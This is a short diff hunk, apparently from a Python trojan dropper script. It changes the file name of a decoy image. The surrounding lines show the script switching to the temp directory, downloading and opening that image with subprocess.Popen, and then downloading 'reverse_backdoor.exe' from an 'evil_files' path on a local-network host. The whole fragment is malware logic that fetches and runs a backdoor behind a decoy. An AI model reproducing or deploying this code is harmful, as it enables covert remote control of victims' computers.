@@ -10,7 +10,7 @@ def download(url):
 temp_directory = tempfile.gettempdir()
 os.chdir(temp_directory)
 
-download("http://192.168.0.104/evil_files/car.jpeg")
+download("http://192.168.0.104/evil_files/cars.jpeg")
 subprocess.Popen("car.jpeg", shell=True)
 
 download("http://192.168.0.104/evil_files/reverse_backdoor.exe")
